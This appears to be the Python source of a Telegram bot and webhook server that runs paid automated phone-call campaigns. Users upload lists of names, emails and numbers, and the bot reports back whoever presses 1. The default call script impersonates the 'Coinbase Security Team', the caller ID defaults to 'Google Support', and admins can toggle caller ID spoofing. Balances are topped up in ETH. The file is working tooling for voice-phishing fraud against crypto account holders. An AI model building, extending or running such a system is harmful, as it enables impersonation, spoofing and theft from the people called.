import os
import json
import uuid
import threading
import asyncio
import random
import logging
import datetime
import sys

from fastapi import FastAPI, Request
import uvicorn

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
     Application,
     CommandHandler,
     CallbackContext,
     MessageHandler,
     filters,
     CallbackQueryHandler,
     ContextTypes,
)

from handlers.payment import payment_handler

try:
     with open(
          "database/config.json",
          "r"
     ) as file:
          config = json.load(
               file
          )
except Exception as e:
     print(
          f"conf load error: {e}"
     )
     config = {}

from handlers.auth import whitelist, unwhitelist, is_whitelisted, topup, get_user_info
from handlers.file import chars_v2, chars_v1, chars_v5, extract_num, escape_markdown, clean_number
from handlers.settings import task_usersettings, load_token, task_saveusers
from handlers.module import run_campaign

bot = None
public_webhook_url = ""
bot_status = "ON"  # global bot status: "ON" or "OFF"
caller_id_spoofing = "ON"  # global caller ID spoofing: "ON" or "OFF"
GCALL_METADATA = {}

# Campaign tracking for pressed_1 counts
CAMPAIGN_PRESSED_1_COUNTS = {}  # {chat_id: count}

# Batch tracking system removed

AUTHORIZED_GROUPS = {}  # {chat_id: {"title": str, "users": [user_ids]}}

def load_groups():
    global AUTHORIZED_GROUPS
    try:
        with open("database/groups.json", "r") as file:
            AUTHORIZED_GROUPS = json.load(file)
    except FileNotFoundError:
        AUTHORIZED_GROUPS = {}

async def execute_campaign(campaign_data):
    """Execute a campaign immediately (no queue, no tracking)"""
    user_id = campaign_data.get("user_id")
    phone_numbers = campaign_data["phone_numbers"]
    metadata = campaign_data.get("metadata", {})
    chat_id = metadata.get("initiator_chat_id")
    pressed_1_count = 0
    
    # Initialize count for this campaign
    if chat_id:
        CAMPAIGN_PRESSED_1_COUNTS[chat_id] = 0
    
    try:
        # Execute the campaign directly
        campaign_result = await asyncio.wait_for(
            run_campaign(
                phone_numbers,
                campaign_data["first_sentence"],
                campaign_data["base_prompt"],
                campaign_data["caller_id"],
                metadata=metadata,
                webhook_url=f"{public_webhook_url}/webhook"
            ),
            timeout=300  # 5 minute timeout
        )
        # Use result from run_campaign (it's more accurate as it counts from call_results)
        pressed_1_count = campaign_result
        logging.info(f"Campaign completed with {pressed_1_count} recipients who pressed 1")
    except asyncio.TimeoutError:
        logging.error(f"Campaign timed out for user {user_id}")
        # Use webhook-tracked count for timeout case
        pressed_1_count = CAMPAIGN_PRESSED_1_COUNTS.get(chat_id, 0)
    except Exception as e:
        logging.error(f"Campaign execution error: {e}")
        # Use webhook-tracked count on error
        pressed_1_count = CAMPAIGN_PRESSED_1_COUNTS.get(chat_id, 0)
    
    # Send batch completion notification to user
    logging.info(f"execute_campaign: Preparing to send notification. chat_id={chat_id}, pressed_1_count={pressed_1_count}")
    if chat_id:
        try:
            notification_msg = f"! -- Batch completed successfully! {pressed_1_count} recipient(s) pressed 1."
            logging.info(f"execute_campaign: Sending notification message to chat_id {chat_id}")
            await bot.bot.send_message(
                chat_id=chat_id,
                text=notification_msg
            )
            logging.info(f"✓ Sent batch completion notification to chat_id {chat_id}: {pressed_1_count} pressed 1")
        except Exception as e:
            logging.error(f"✗ Failed to send batch completion notification to chat_id {chat_id}: {e}")
            import traceback
            logging.error(traceback.format_exc())
        finally:
            # Clean up the count for this campaign
            if chat_id in CAMPAIGN_PRESSED_1_COUNTS:
                del CAMPAIGN_PRESSED_1_COUNTS[chat_id]
    else:
        logging.warning(f"execute_campaign: No chat_id found in metadata, cannot send notification. metadata={metadata}")

def save_groups():
    try:
        with open("database/groups.json", "w") as file:
            json.dump(AUTHORIZED_GROUPS, file, indent=4)
    except Exception as e:
        print(f"ee saving groups: {e}")

load_groups()

def is_admin(user_id: str) -> bool:
    try:
        user_id_int = int(user_id)
        return user_id_int in config.get("admins", [])
    except:
        return False

async def status_command(update: Update, context: CallbackContext):
    global bot_status
    user_id = str(update.effective_user.id)
    
    
    if not is_admin(user_id):
        return
    
    if not context.args:
        await update.message.reply_text(
            f"Bot status\n\n"
            f"Current Status: `{bot_status}`\n\n"
            f"ex: `/status ON` or `/status OFF`",
            parse_mode="Markdown"
        )
        return
    
    status_arg = context.args[0].upper()
    
    if status_arg == "ON":
        bot_status = "ON"
        await update.message.reply_text(
            "Bot Status Updated\n\n"
            "Status: `ON`\n"
            "The bot is now online",
            parse_mode="Markdown"
        )
    elif status_arg == "OFF":
        bot_status = "OFF"
        await update.message.reply_text(
            "Bot Status Updated\n\n"
            "Status: `OFF`\n"
            "The bot is now offline for maintenance.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "Invalid Status\n\n"
            "ex: `/status ON` or `/status OFF`",
            parse_mode="Markdown"
        )

async def cid_command(update: Update, context: CallbackContext):
    global caller_id_spoofing
    user_id = str(update.effective_user.id)
    
    if not is_admin(user_id):
        return
    
    if not context.args:
        await update.message.reply_text(
            f"Caller ID Spoofing Control\n\n"
            f"Current Status: `{caller_id_spoofing}`\n\n"
            f"ex: `/cid ON` or `/cid OFF`",
            parse_mode="Markdown"
        )
        return
    
    status_arg = context.args[0].upper()
    
    if status_arg == "ON":
        caller_id_spoofing = "ON"
        await update.message.reply_text(
            "Caller ID Spoofing Updated\n\n"
            "Status: `ON`\n"
            "Users can now set custom caller IDs",
            parse_mode="Markdown"
        )
    elif status_arg == "OFF":
        caller_id_spoofing = "OFF"
        await update.message.reply_text(
            "Caller ID Spoofing Updated\n\n"
            "Status: `OFF`\n"
            "All calls will use 'Random 888' pool (rotating caller IDs)",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "Invalid Status\n\n"
            "ex: `/cid ON` or `/cid OFF`",
            parse_mode="Markdown"
        )

def check_bot_status(func):
    async def wrapper(update: Update, context: CallbackContext):
        global bot_status
        user_id = str(update.effective_user.id)
        chat_id = str(update.effective_chat.id)
        
        if is_admin(user_id):
            return await func(update, context)
        
        if bot_status == "OFF":
            await update.message.reply_text(
                "Bot Offline\n\n"
                "The bot is currently offline for maintenance.\n"
                "Please contact an admin for any issues.",
                parse_mode="Markdown"
            )
            return
        
        if update.effective_chat.type in ['group', 'supergroup']:
            if not is_user_authorized_for_group(user_id, chat_id):
                return
        return await func(update, context)
    
    return wrapper

async def addgc_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    
    if not is_admin(user_id):
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "invalid use case\n\n"
            "ex: `/addgc [chat_id] [title]`\n"
            "ex: `/addgc -1001234567890 \"My Group\"`",
            parse_mode="Markdown"
        )
        return
    
    chat_id = context.args[0]
    title = " ".join(context.args[1:]).strip('"')
    
    AUTHORIZED_GROUPS[chat_id] = {
        "title": title,
        "users": []
    }
    save_groups()
    
    await update.message.reply_text(
        f"Group Added\n\n"
        f"Chat ID: `{chat_id}`\n"
        f"Title: `{title}`\n\n"
        f"Group has been added to the authorized groups list.",
        parse_mode="Markdown"
    )

async def delgc_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    
    if not is_admin(user_id):
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "invalid use case\n\n"
            "ex: `/delgc [chat_id]`\n"
            "ex: `/delgc -1001234567890`",
            parse_mode="Markdown"
        )
        return
    
    chat_id = context.args[0]
    
    if chat_id not in AUTHORIZED_GROUPS:
        await update.message.reply_text(
            f"Group Not Found\n\n"
            f"Chat ID `{chat_id}` is not in the authorized groups list.",
            parse_mode="Markdown"
        )
        return
    
    group_info = AUTHORIZED_GROUPS[chat_id]
    del AUTHORIZED_GROUPS[chat_id]
    save_groups()
    
    await update.message.reply_text(
        f"Group Removed\n\n"
        f"Chat ID: `{chat_id}`\n"
        f"Title: `{group_info['title']}`\n\n"
        f"Group has been removed from the authorized groups list.",
        parse_mode="Markdown"
    )

async def addusertogc_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    
    if not is_admin(user_id):
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "invalid use case\n\n"
            "Usage: `/addusertogc [user_id] [chat_id]`\n"
            "Example: `/addusertogc 123456789 -1001234567890`",
            parse_mode="Markdown"
        )
        return
    
    target_user_id = context.args[0]
    chat_id = context.args[1]
    
    if chat_id not in AUTHORIZED_GROUPS:
        await update.message.reply_text(
            f"Group Not Found\n\n"
            f"Chat ID `{chat_id}` is not in the authorized groups list.",
            parse_mode="Markdown"
        )
        return
    
    if target_user_id in AUTHORIZED_GROUPS[chat_id]["users"]:
        await update.message.reply_text(
            f"User Already Added\n\n"
            f"User `{target_user_id}` is already in group `{chat_id}`.",
            parse_mode="Markdown"
        )
        return
    
    AUTHORIZED_GROUPS[chat_id]["users"].append(target_user_id)
    save_groups()
    
    await update.message.reply_text(
        f"User Added to Group\n\n"
        f"User ID: `{target_user_id}`\n"
        f"Group: `{AUTHORIZED_GROUPS[chat_id]['title']}`\n"
        f"Chat ID: `{chat_id}`",
        parse_mode="Markdown"
    )

async def deluserfromgc_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    
    if not is_admin(user_id):
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "invalid use case\n\n"
            "ex: `/deluserfromgc [user_id] [chat_id]`\n"
            "ex: `/deluserfromgc 123456789 -1001234567890`",
            parse_mode="Markdown"
        )
        return
    
    target_user_id = context.args[0]
    chat_id = context.args[1]
    
    if chat_id not in AUTHORIZED_GROUPS:
        await update.message.reply_text(
            f"Group Not Found\n\n"
            f"Chat ID `{chat_id}` is not in the authorized groups list.",
            parse_mode="Markdown"
        )
        return
    
    if target_user_id not in AUTHORIZED_GROUPS[chat_id]["users"]:
        await update.message.reply_text(
            f"User Not Found\n\n"
            f"User `{target_user_id}` is not in group `{chat_id}`.",
            parse_mode="Markdown"
        )
        return
    
    AUTHORIZED_GROUPS[chat_id]["users"].remove(target_user_id)
    save_groups()
    
    await update.message.reply_text(
        f"User Removed from Group\n\n"
        f"User ID: `{target_user_id}`\n"
        f"Group: `{AUTHORIZED_GROUPS[chat_id]['title']}`\n"
        f"Chat ID: `{chat_id}`",
        parse_mode="Markdown"
    )

async def listgc_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    
    if not is_admin(user_id):
        return
    
    if not AUTHORIZED_GROUPS:
        await update.message.reply_text(
            "Authorized Groups\n\n"
            "No authorized groups found.",
            parse_mode="Markdown"
        )
        return
    
    message = "Authorized Groups\n\n"
    
    for chat_id, group_info in AUTHORIZED_GROUPS.items():
        user_count = len(group_info["users"])
        message += (
            f"{group_info['title']}\n"
            f"   Chat ID: `{chat_id}`\n"
            f"   Users: `{user_count}`\n\n"
        )
    
    await update.message.reply_text(message, parse_mode="Markdown")

async def gcinfo_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    
    if not is_admin(user_id):
        return
    
    # check arguments
    if len(context.args) < 1:
        await update.message.reply_text(
            "invalid use case\n\n"
            "Usage: `/gcinfo [chat_id]`\n"
            "Example: `/gcinfo -1001234567890`",
            parse_mode="Markdown"
        )
        return
    
    chat_id = context.args[0]
    
    if chat_id not in AUTHORIZED_GROUPS:
        await update.message.reply_text(
            f"Group Not Found\n\n"
            f"Chat ID `{chat_id}` is not in the authorized groups list.",
            parse_mode="Markdown"
        )
        return
    
    group_info = AUTHORIZED_GROUPS[chat_id]
    user_list = group_info["users"]
    
    message = (
        f"📊 *Group Information*\n\n"
        f"🏷️ Title: `{group_info['title']}`\n"
        f"🆔 Chat ID: `{chat_id}`\n"
        f"👥 Total Users: `{len(user_list)}`\n\n"
    )
    
    if user_list:
        message += "👤 *Users:*\n"
        for user_id in user_list:
            message += f"   • `{user_id}`\n"
    else:
        message += "👤 *Users:* None"
    
    await update.message.reply_text(message, parse_mode="Markdown")

def is_user_authorized_for_group(user_id: str, chat_id: str) -> bool:
    if is_admin(user_id):
        return True
    
    if chat_id in AUTHORIZED_GROUPS:
        return str(user_id) in AUTHORIZED_GROUPS[chat_id]["users"]
    
    return False

logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
     handlers=[
          logging.FileHandler("database/logs/sip_call.log"),
          logging.StreamHandler()
     ]
)

webapp = FastAPI()

# tracking webhook removed

@webapp.post(
    "/webhook"
)
async def receive_webhook(
     request: Request
):
     payload = await request.json()
     logging.info(
          f"Webhook received: {payload}"
     )
     chat_id = payload.get(
          "initiator_chat_id"
     )
     phone_number = payload.get(
          "target_number"
     )
     pressed_1 = payload.get(
          "pressed_1"
     )
     phone_display = phone_number.lstrip(
          '+'
     ) if phone_number else "Unknown"
     meta = GCALL_METADATA.get(
          phone_number,
          {}
     )
     email = meta.get(
          "email",
          "N/A"
     )
     line = meta.get(
          "line",
          "N/A"
     )
     if pressed_1:
          # Increment pressed_1 count for this campaign
          if chat_id:
               CAMPAIGN_PRESSED_1_COUNTS[chat_id] = CAMPAIGN_PRESSED_1_COUNTS.get(chat_id, 0) + 1
          
          result_msg = (
               "👨‍💼 New Recipient Pressed 1\n"
               f"— Email: `{email}`\n"
               f"— Phone: `{phone_display}`\n"
               f"— Line: `{line}`"
          )
          if chat_id:
               try:
                    await bot.bot.send_message(
                         chat_id=chat_id,
                         text=result_msg,
                         parse_mode="MarkdownV2"
                    )
               except Exception as e:
                    logging.error(
                         f"[ERROR] sending -> {chat_id}: {e}"
                    )
     return {
          "status": "ok"
     }


# telegram base bot handler (sec1.1)
@check_bot_status
async def start(
     update: Update,
     context: CallbackContext
):
     user_id = str(
          update.effective_user.id
     )
     
     if not is_whitelisted(user_id):
          return 
     
     settings = task_usersettings()
     if user_id not in settings:
          settings[user_id] = {
               'first_script': '1',
               'second_script': '2',
               'line_bot': True,
               'balance': 0.0,
               'caller_id': 'Google Support'
          }
     settings[user_id]['chat_id'] = update.effective_chat.id
     task_saveusers(settings)
     message = update.message or update.callback_query.message
     keyboard = [
          [
               InlineKeyboardButton(
                    "📞 Start batch",
                    callback_data='start_batch'
               ),
               InlineKeyboardButton(
                    "ℹ️ Help",
                    callback_data='help'
               )
          ],
          [
               InlineKeyboardButton(
                    "💰 Balance",
                    callback_data='balance'
               ),
               InlineKeyboardButton(
                    "⚙️ Configuration",
                    callback_data='settings'
               )
          ],
          [
               InlineKeyboardButton(
                    "👥 Support",
                    callback_data='support'
               )
          ]
     ]
     reply_markup = InlineKeyboardMarkup(
          keyboard
     )
     if update.callback_query:
          await message.edit_text(
               "Welcome to Module's Call Bot! 📞\nClick the buttons below to get started! 🚀",
               reply_markup=reply_markup
          )
     else:
          await message.reply_text(
               "Welcome to Module's Call Bot! 📞\nClick the buttons below to get started! 🚀",
               reply_markup=reply_markup
          )

async def start_batch_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     start_message = (
          "☎️ Follow the instructions below to start.\n\n"
          "To start a batch, upload a .txt file with the format below (ONLY .txt files are allowed):\n\n"
          "`name | email | number`\n"
          "`john smith | john@gmail.com | +1234567890`\n\n"
          "📌 Ensure each entry is on a new line and includes a country code."
     )
     keyboard = [
          [
               InlineKeyboardButton(
                    "Upload Batch 📂",
                    callback_data='upload_batch'
               )
          ],
          [
               InlineKeyboardButton(
                    "Back 🔙",
                    callback_data='mainpage'
               )
          ]
     ]
     await query.answer()
     await query.edit_message_text(
          start_message,
          reply_markup=InlineKeyboardMarkup(
               keyboard
          ),
          parse_mode="Markdown"
     )

async def upload_batch_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     await query.answer()
     upload_prompt = (
          "📤 You __MUST__ upload a .txt file containing the batch of numbers in the format:\n\n"
          "`name | email | number`\n"
          "`john smith | john@gmail.com | +1234567890`\n\n"
          "Each entry must be on a new line."
     )
     keyboard = [
          [
               InlineKeyboardButton(
                    "Back 🔙",
                    callback_data='start_batch'
               )
          ]
     ]
     await query.edit_message_text(
          upload_prompt,
          reply_markup=InlineKeyboardMarkup(
               keyboard
          ),
          parse_mode="Markdown"
     )

async def help_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     await query.answer()
     help_message = (
          "Must Read\n\n"
          "Here are some instructions on how to use the bot:\n\n"
          "📞 **Batch**: Upload a .txt file to start a batch.\n\n"
          "💰 **Balance**: Check your balance. Each call costs `$0.30`.\n"
          "The minimum deposit allowed is `$150.00`.\n\n"
          "⚙️ **Configuration**: Configure your settings. Your first script is played when a call is accepted, "
          "and your second script when the target presses '1'.\n\n"
          "Use /line to get the most recent line played.\n\n"
          "👥 **Support**: Contact support for help.\n\n"
          "For further assistance, contact @somethings86."
     )
     keyboard = [
          [
               InlineKeyboardButton(
                    "Back 🔙",
                    callback_data='mainpage'
               )
          ]
     ]
     await query.edit_message_text(
          help_message,
          reply_markup=InlineKeyboardMarkup(
               keyboard
          ),
          parse_mode="Markdown"
     )

async def support_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     support_message = (
          "🛠 Support Guidelines\n\n"
          "Please only contact support for valid reasons:\n"
          "1. The bot is down or unresponsive.\n"
          "2. You need to top up your balance.\n\n"
          "**Do not contact support for unrelated matters.**\n\n"
          "To proceed, click the button below to contact support."
     )
     keyboard = [
          [
               InlineKeyboardButton(
                    "Contact Support 📞",
                    url="https://t.me/somethings86"
               )
          ],
          [
               InlineKeyboardButton(
                    "Back 🔙",
                    callback_data='mainpage'
               )
          ]
     ]
     await query.answer()
     await query.edit_message_text(
          support_message,
          reply_markup=InlineKeyboardMarkup(
               keyboard
          ),
          parse_mode="Markdown"
     )

async def balance_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     user_id = str(
          query.from_user.id
     )
     
     if not is_whitelisted(user_id):
          return  
     
     settings = task_usersettings()
     if user_id not in settings:
          settings[user_id] = {
               'first_script': '1',
               'second_script': '2',
               'line_bot': True,
               'balance': 0.0,
               'caller_id': 'Google Support'
          }
          task_saveusers(
               settings
          )
     user_balance = settings[user_id].get(
          'balance',
          0.0
     )
     balance_message = (
          f"💰 *Balance Information*\n\n"
          f"💵 Current Balance: `${user_balance:.2f}`\n\n"
          f"📞 Each call costs: `$0.30`\n"
          f"💳 Minimum top-up: `$50.00`\n\n"
          f"*Choose an option below:*"
     )
     keyboard = [
          [
               InlineKeyboardButton(
                    "💳 Top Up Balance",
                    callback_data='topup_balance'
               ),
               InlineKeyboardButton(
                    "Contact Support 📞",
                    url="https://t.me/somethings86"
               )
          ],
          [
               InlineKeyboardButton(
                    "Back 🔙",
                    callback_data='mainpage'
               )
          ]
     ]
     await query.answer()
     await query.edit_message_text(
          balance_message,
          reply_markup=InlineKeyboardMarkup(
               keyboard
          ),
          parse_mode="Markdown"
     )

async def topup_balance_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     user_id = str(query.from_user.id)
     
     await query.answer()
     
     topup_message = (
          f"💳 *Top Up Balance*\n\n"
          f"> Minimum amount: `$50.00`\n"
          f"> Maximum amount: `$1000.00`\n\n"
          f"*Please enter the amount in USD you want to top up:*\n"
          f"*Example: 50.00*"
     )
     
     keyboard = [
          [
               InlineKeyboardButton(
                    "Back to Balance 🔙",
                    callback_data='balance'
               )
          ]
     ]
     
     await query.edit_message_text(
          topup_message,
          reply_markup=InlineKeyboardMarkup(keyboard),
          parse_mode="Markdown"
     )
     
     context.user_data['waiting_for_topup_amount'] = True

async def handle_topup_amount(
     update: Update,
     context: CallbackContext
):
     if not context.user_data.get('waiting_for_topup_amount', False):
          return
     
     message = update.message
     user_id = str(message.from_user.id)
     
     try:
          amount_text = message.text.strip()
          amount = float(amount_text)
          
          if amount < 50.0:
               await message.reply_text(
                    "> Invalid Amount\n\n"
                    "Minimum top-up amount is `$50.00`\n"
                    "Please enter a valid amount or contact support.",
                    parse_mode="Markdown"
               )
               return
          
          if amount > 1000.0:
               await message.reply_text(
                    "> Invalid Amount\n\n"
                    "Maximum top-up amount is `$1000.00`\n"
                    "Please enter a valid amount:",
                    parse_mode="Markdown"
               )
               return
          
          context.user_data['waiting_for_topup_amount'] = False
          
          processing_msg = await message.reply_text(
               "⏳ Processing Payment...\n\n"
               "Please wait while we create your payment...",
               parse_mode="Markdown"
          )
          
          eth_price = await payment_handler.get_eth_price()
          if not eth_price:
               await processing_msg.edit_text(
                    "> Payment Error\n\n"
                    "Unable to get current ETH price. Please try again later or contact support.",
                    parse_mode="Markdown"
               )
               return
          
          # create payment
          payment_data = await payment_handler.create_payment(
               amount, 
               f"Balance top-up for user {user_id}"
          )
          
          if "error" in payment_data:
               await processing_msg.edit_text(
                    f"❌ *Payment Error*\n\n{payment_data['error']}",
                    parse_mode="Markdown"
               )
               return
          
          payment_info = payment_handler.format_payment_info(payment_data, eth_price)
          
          keyboard = [
               [
                    InlineKeyboardButton(
                         "🔄 Check Status",
                         callback_data=f'check_payment_{payment_data["payment_id"]}'
                    )
               ],
               [
                    InlineKeyboardButton(
                         "Back to Balance 🔙",
                         callback_data='balance'
                    )
               ]
          ]
          
          await processing_msg.edit_text(
               payment_info,
               reply_markup=InlineKeyboardMarkup(keyboard),
               parse_mode="Markdown"
          )
          
          context.user_data[f'payment_{payment_data["payment_id"]}'] = {
               'amount': amount,
               'created_at': payment_data.get('created_at'),
               'wallet_id': payment_data.get('wallet_id')
          }
          
     except ValueError:
          await message.reply_text(
               "> Invalid Format\n\n"
               "Please enter a valid number (e.g., 50.00):",
               parse_mode="Markdown"
          )
     except Exception as e:
          logging.error(f"Error in handle_topup_amount: {e}")
          await message.reply_text(
               "> Error\n\n"
               "An error occurred. Please try again later or contact support.",
               parse_mode="Markdown"
          )
          context.user_data['waiting_for_topup_amount'] = False

@check_bot_status
async def handle_text_message(
     update: Update,
     context: CallbackContext
):
     user_id = str(update.effective_user.id)
     
     if not is_whitelisted(user_id):
          return  
     
     if context.user_data.get('waiting_for_topup_amount', False):
          await handle_topup_amount(update, context)
     else:
          await scriptsv1_input(update, context)

async def check_payment_status_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     user_id = str(query.from_user.id)
     
     if not is_whitelisted(user_id):
          return  
     
     payment_id = query.data.replace('check_payment_', '')
     
     await query.answer("Checking payment status...")
     
     try:
          status_data = await payment_handler.check_payment_status(payment_id)
          
          if not status_data:
               await query.edit_message_text(
                    "> Status Check Failed\n\n"
                    "Unable to check payment status. Please try again later or contact support.",
                    parse_mode="Markdown"
               )
               return
          
          status = status_data.get('status', 'unknown')
          confirmations = status_data.get('confirmations', 0)
          amount_received = status_data.get('amount_received', 0)
          
          if status == 'confirmed' and confirmations >= 2:
               settings = task_usersettings()
               if user_id not in settings:
                    settings[user_id] = {
                         'first_script': '1',
                         'second_script': '2',
                         'line_bot': True,
                         'balance': 0.0,
                         'caller_id': 'Google Support'
                    }
               
               payment_info = context.user_data.get(f'payment_{payment_id}', {})
               original_amount = payment_info.get('amount', 0)
               
               settings[user_id]['balance'] += original_amount
               task_saveusers(settings)
               
               if f'payment_{payment_id}' in context.user_data:
                    del context.user_data[f'payment_{payment_id}']
               
               success_message = (
                    f"> Payment Confirmed!\n\n"
                    f"> Amount: `${original_amount:.2f}`\n"
                    f"> Confirmations: {confirmations}\n\n"
                    f"Your new balance: `${settings[user_id]['balance']:.2f}`"
               )
               
               keyboard = [
                    [
                         InlineKeyboardButton(
                              "Back to Balance 🔙",
                              callback_data='balance'
                         )
                    ]
               ]
               
               await query.edit_message_text(
                    success_message,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="Markdown"
               )
               
          elif status == 'pending':
               status_message = (
                    f"⏳ *Payment Pending*\n\n"
                    f"📊 Status: {status.upper()}\n"
                    f"🔍 Confirmations: {confirmations}\n"
                    f"💰 Amount Received: {amount_received:.8f} ETH\n\n"
                    f"*Payment is still being processed. Please wait for confirmations.*"
               )
               
               keyboard = [
                    [
                         InlineKeyboardButton(
                              "🔄 Check Again",
                              callback_data=f'check_payment_{payment_id}'
                         )
                    ],
                    [
                         InlineKeyboardButton(
                              "Back to Balance 🔙",
                              callback_data='balance'
                         )
                    ]
               ]
               
               await query.edit_message_text(
                    status_message,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="Markdown"
               )
               
          else:
               error_message = (
                    f"> Payment Error\n\n"
                    f"📊 Status: {status.upper()}\n"
                    f"🔍 Confirmations: {confirmations}\n\n"
                    f"*There was an issue with your payment.*"
               )
               
               keyboard = [
                    [
                         InlineKeyboardButton(
                              "Back to Balance 🔙",
                              callback_data='balance'
                         )
                    ]
               ]
               
               await query.edit_message_text(
                    error_message,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="Markdown"
               )
               
     except Exception as e:
          logging.error(f"Error checking payment status: {e}")
          await query.edit_message_text(
               "❌ *Error*\n\n"
               "An error occurred while checking payment status.",
               parse_mode="Markdown"
          )

async def settings_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     user_id = str(
          query.from_user.id
     )
     
     if not is_whitelisted(user_id):
          return  
     
     settings = task_usersettings()
     if user_id not in settings:
          settings[user_id] = {
               'first_script': (
                    "Hello, this is an automated call from the Coinbase Security Team. "
                    "We are reaching out regarding a recent email reset request for your Coinbase account. "
                    "If you did not initiate this request and need to secure your account, please press 1."
               ),
               'second_script': (
                    "Thank you for pressing 1. A representative will contact you shortly. "
                    "We appreciate you using Coinbase."
               ),
               'line_bot': True,
               'caller_id': 'Google Support'
          }
          task_saveusers(
               settings
          )
     user_settings = settings[user_id]
     first_script_text = chars_v5(
          chars_v1(
               user_settings['first_script']
          )
     )
     second_script_text = chars_v5(
          chars_v1(
               user_settings['second_script']
          )
     )
     keyboard = [
          [
               InlineKeyboardButton(
                    "📋 Edit First Script",
                    callback_data='edit_first_script'
               ),
               InlineKeyboardButton(
                    "📋 Edit Second Script",
                    callback_data='edit_second_script'
               )
          ],
          [
               InlineKeyboardButton(
                    "📝 Default Script",
                    callback_data='default_script'
               ),
               InlineKeyboardButton(
                    f"⌛ Line Bot: {'On' if user_settings['line_bot'] else 'Off'}",
                    callback_data='toggle_line_bot'
               )
          ],
          [
               InlineKeyboardButton(
                    "Change Caller ID",
                    callback_data='change_caller_id'
               )
          ],
          [
               InlineKeyboardButton(
                    "Back 🔙",
                    callback_data='mainpage'
               )
          ]
     ]
     new_message = (
          f"👥 *User Configuration Panel*\n\n"
          f"🆔 UID: {chars_v5(chars_v1(user_id))} \\- Contact @somethings86 for any issues\n\n"
          f"📋 *First Script:* `{first_script_text}`\n\n"
          f"📋 *Second Script:* `{second_script_text}`\n\n"
          f"🤖 *Line Bot:* Status → {'Enabled, run /line' if user_settings['line_bot'] else 'Disabled'}\n\n"
          f"📞 *Caller ID:* {user_settings.get('caller_id', 'Google Support')}\n\n"
          f"🔒 *Caller ID Spoofing:* {caller_id_spoofing}"
     )
     if query.message.text != new_message or query.message.reply_markup != InlineKeyboardMarkup(
          keyboard
     ):
          await query.edit_message_text(
               text=new_message,
               reply_markup=InlineKeyboardMarkup(
                    keyboard
               ),
               parse_mode="MarkdownV2"
          )

async def editsv1_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     await query.answer()
     context.user_data['editing_script'] = 'first_script'
     await query.edit_message_text(
          chars_v2(
               "Please send what you want your new script to be"
          ),
          parse_mode="MarkdownV2"
     )

async def editsv2_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     await query.answer()
     context.user_data['editing_script'] = 'second_script'
     await query.edit_message_text(
          chars_v2(
               "Please send what you want your new script to be"
          ),
          parse_mode="MarkdownV2"
     )

async def scriptsv1_input(
     update: Update,
     context: CallbackContext
):
     user_id = str(
          update.effective_user.id
     )
     settings = task_usersettings()
     editing_script = context.user_data.get(
          'editing_script'
     )
     if editing_script not in ['first_script', 'second_script']:
          return
     new_value = update.message.text
     settings[user_id][editing_script] = new_value
     task_saveusers(
          settings
     )
     escaped_text = escape_markdown(
          new_value
     )
     await update.message.reply_text(
          f"{'First' if editing_script == 'first_script' else 'Second'} Script updated to: {escaped_text}",
          parse_mode="MarkdownV2"
     )
     context.user_data['editing_script'] = None

async def base_script_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     user_id = str(
          query.from_user.id
     )
     
     if not is_whitelisted(user_id):
          return  
     
     settings = task_usersettings()
     settings[user_id] = {
          'first_script': (
               "Hello, this is an automated call from the Coinbase Security Team. "
               "We are reaching out regarding a recent email reset request for your Coinbase account. "
               "If you did not initiate this request and need to secure your account, please press 1."
          ),
          'second_script': (
               "Thank you for pressing 1. A representative will contact you shortly. "
               "We appreciate you using Coinbase."
          ),
          'line_bot': True,
          'caller_id': 'Google Support'
     }
     task_saveusers(
          settings
     )
     await query.answer(
          "Script reset to default"
     )
     await settings_handler(
          update,
          context
     )

async def linebot_toggler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     user_id = str(
          query.from_user.id
     )
     settings = task_usersettings()
     current_state = settings[user_id]['line_bot']
     settings[user_id]['line_bot'] = not current_state
     task_saveusers(
          settings
     )
     await query.answer(
          f"Line Bot {'Enabled' if not current_state else 'Disabled'}."
     )
     await settings_handler(
          update,
          context
     )

async def last_line_handler(
     update: Update,
     context: CallbackContext
):
     user_id = str(
          update.effective_user.id
     )
     settings = task_usersettings()
     if user_id not in settings:
          return
     if not settings[user_id]['line_bot']:
          await update.message.reply_text(
               "Line Bot is disabled. Enable it in settings to track the last line."
          )
          return
     last_line = settings[user_id].get(
          'last_line',
          "N/A"
     )
     await update.message.reply_text(
          f"🐄 Last line played:\n{last_line}",
          parse_mode="MarkdownV2"
     )

async def mainpage_handler(
     update: Update,
     context: CallbackContext
):
     query = update.callback_query
     await query.answer()
     await start(
          update,
          context
     )

# Queue status handler removed (queue system removed)

# Text command handler for queue status
@check_bot_status
async def handle_text_message(update: Update, context: CallbackContext):
    """Handle text messages for script edits and general input"""
    user_id = str(update.effective_user.id)
    
    if not is_whitelisted(user_id):
        return  
    
    if not update.message or not update.message.text:
        return
    
